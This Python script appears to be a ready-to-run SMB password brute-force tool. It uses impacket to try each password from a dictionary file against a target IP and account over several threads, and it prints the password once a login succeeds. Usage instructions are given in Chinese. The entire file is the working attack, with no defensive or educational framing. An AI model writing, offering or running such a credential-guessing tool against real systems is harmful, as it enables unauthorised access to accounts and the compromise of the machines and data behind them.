#coding:utf-8


import sys
import threading
import time
from colorama import Fore
import os
from impacket import smb
model_path=os.getcwd()
sys.path.append(model_path)


maxConnections = 5
snp = threading.Semaphore(value=maxConnections)

Flag = False
count = 0
Find = False
def smb_login(ipaddr,username,password):

    global Flag,count,Find
    GREEN = Fore.GREEN  # 找到后的密码以绿色标亮
    RESET = Fore.RESET  # 找到后的密码以绿色标亮
    try:
        print(f'[-] testing {password} is error,login failed，try {count}')
        count += 1
        client=smb.SMB('*SMBSERVER',ipaddr)
        client.login(username, password)
        Flag = True
        if Flag:
            #print(f'rdp_login {Flag}')
            print(f'{GREEN}[+] {ipaddr} login secessful! password is >>>{password}<<<{RESET}')
            Find = True

    except smb.SessionError as e:
        #print("登录失败：", e)
        pass

    except Exception as e:
        print(f'异常：{e}')
        print(f'有异常的密码:{password}')
        print("线程睡60s")
        time.sleep(60)
        smb_login(ipaddr,username,password)
    snp.release()

#smb_login('192.168.145.139','administrator','P@ssw0r1d')

def main():
    if len(sys.argv) < 3 or len(sys.argv) > 6:
        print("""
        用法：python <脚本名> <ip地址> <帐号名> <密码文件字典>
        注意:如果没有域，就不填
        例子：
        python brueforce_smb.py 192.168.1.2 administrator password.txt
        """)
        sys.exit(0)
    """
    ip=sys.argv[1]
    account=sys.argv[2]
    passwordfile=sys.argv[3]
    print(ip,port,account,passwordfile,domains)
    """

    passwordfile = sys.argv[3]
    with open(passwordfile,mode='rt',encoding='utf-8-sig') as password_f:
        for password_line in password_f:
            if Find:
                #print(f'main {Flag}')
                print(f'{sys.argv[1]} password is find ')
                print(f'一共测试了{count}次')
                sys.exit(0)
            passwd = password_line.strip()

            #print(passwd)
            snp.acquire()
            #t = threading.Thread(target=rdp_login,args=(sys.argv[1],int(sys.argv[2]),sys.argv[3],passwd,sys.argv[5]))
            t = threading.Thread(target=smb_login,
                                 args=(sys.argv[1],sys.argv[2],passwd))
            t.start()

if __name__=='__main__':
    main()

